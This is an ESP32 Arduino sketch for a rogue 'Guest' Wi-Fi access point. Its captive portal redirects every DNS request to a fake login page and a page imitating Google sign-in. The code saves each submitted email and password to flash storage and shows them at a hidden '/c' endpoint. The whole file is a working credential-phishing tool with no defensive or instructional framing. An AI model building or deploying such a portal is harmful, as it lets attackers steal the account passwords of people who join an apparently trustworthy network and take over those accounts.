#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>

const byte DNS_PORT = 53;
IPAddress apIP(8, 8, 4, 4);
DNSServer dnsServer;
WebServer server(80);

// Function to retrieve stored credentials from LittleFS
String getCredentials() {
  String credentials;
  File file = LittleFS.open("/credentials.txt", "r");
  if (!file) {
    credentials = "No credentials stored.";
  } else {
    while (file.available()) {
      credentials += char(file.read());
    }
    file.close();
  }
  return credentials;
}

void setup() {
  Serial.begin(115200);

  // Initialize LittleFS
  if (!LittleFS.begin(true)) {
    Serial.println("Failed to mount LittleFS");
    return;
  }

  // Configure the fake WiFi AP
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Guest");
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  dnsServer.start(DNS_PORT, "*", apIP);

  // Handle Apple's captive portal requests
    server.on("/hotspot-detect.html", HTTP_GET, []() { 
        server.sendHeader("Location", "/", true); // Redirect to root (captive portal page) 
        server.send(302, "text/html", "<html><body>Redirecting...</body></html>"); // iOS captive portal check
    });
    server.on("/", HTTP_GET, []() {

    // Main login page
    String responseHTML =
        "<!DOCTYPE html>"
        "<html>"
        "<head>"
        "<meta name='viewport' content='width=device-width, initial-scale=1'>"
        "<title>Guest WiFi Login</title>"
        "<style>"
        "body {font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f3f4f6; margin: 0;}"
        ".container {text-align: center; background: white; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border-radius: 10px; padding: 30px; width: 90%; max-width: 400px;}"
        ".logo {width: 80px; margin-bottom: 20px;}"
        "h2 {margin: 10px 0; font-size: 24px; color: #333;}"
        ".input-field {width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 14px;}"
        ".submit-button, .google-button {width: 87%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; font-size: 16px; cursor: pointer;}"
        ".submit-button {background-color: #4285f4; color: white;}"
        ".google-button {display: flex; align-items: center; justify-content: center; background-color: white; color: #555; border: 1px solid #ddd;}"
        ".google-button img {width: 20px; height: 20px; margin-right: 8px;}"
        ".footer {margin-top: 20px; font-size: 12px; color: #888;}"
        "</style>"
        "</head>"
        "<body>"
        "<div class='container'>"
        "<h2>Sign in or Sign up to Connect</h2>"
        "<form action='/login' method='POST'>"
        "<input class='input-field' type='email' name='email' placeholder='Email address' required>"
        "<input class='input-field' type='password' name='password' placeholder='Password' required>"
        "<button class='submit-button' type='submit'>Login</button>"
        "</form>"
        "<a class='google-button' href='/google-login'>"
        "Login with Google"
        "</a>"
        "</div>"
        "</body>"
        "</html>";

    server.send(200, "text/html", responseHTML);
  });

  // Handle form submission and save credentials
  server.on("/login", HTTP_POST, []() {
    String email = server.arg("email");
    String password = server.arg("password");

    File file = LittleFS.open("/credentials.txt", "a");
    if (file) {
      file.println("Email: " + email);
      file.println("Password: " + password);
      file.println();
      file.close();
    }

    server.send(200, "text/html", "<html><body><h2>Thank you for logging in</h2><p>You are now connected.</p></body></html>");
  });

  // Mock "Login with Google" page
  server.on("/google-login", HTTP_GET, []() {
    String googleLoginHTML =
        "<!DOCTYPE html>"
        "<html>"
        "<head>"
        "<meta name='viewport' content='width=device-width, initial-scale=1'>"
        "<title>Sign in - Google Accounts</title>"
        "<style>"
        "body {font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f3f4f6; margin: 0;}"
        ".container {text-align: center; background: white; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border-radius: 10px; padding: 30px; width: 90%; max-width: 400px;}"
        "h2 {margin: 10px 0; font-size: 20px; color: #333;}"
        ".input-field {width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 14px;}"
        ".submit-button {width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; background-color: #4285f4; color: white; font-size: 16px; cursor: pointer;}"
        "</style>"
        "</head>"
        "<body>"
        "<div class='container'>"
        "<h2>Sign in with Google</h2>"
        "<form action='/google-credentials' method='POST'>"
        "<input class='input-field' type='email' name='email' placeholder='Email or phone' required>"
        "<input class='input-field' type='password' name='password' placeholder='Enter your password' required>"
        "<button class='submit-button' type='submit'>Next</button>"
        "</form>"
        "</div>"
        "</body>"
        "</html>";

    server.send(200, "text/html", googleLoginHTML);
  });

  // Handle Google credentials submission
  server.on("/google-credentials", HTTP_POST, []() {
    String email = server.arg("email");
    String password = server.arg("password");

    File file = LittleFS.open("/credentials.txt", "a");
    if (file) {
      file.println("Google Email: " + email);
      file.println("Google Password: " + password);
      file.println();
      file.close();
    }

    server.send(200, "text/html", "<html><body><h2>Authentication Complete</h2><p>Redirecting...</p></body></html>");
  });

  // Display saved credentials
  server.on("/c", HTTP_GET, []() {
    String credentials = getCredentials();
    server.send(200, "text/plain", credentials);
  });

  // Redirect any unknown requests to the main page
  server.onNotFound([]() {
    server.sendHeader("Location", "/");
    server.send(303);
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
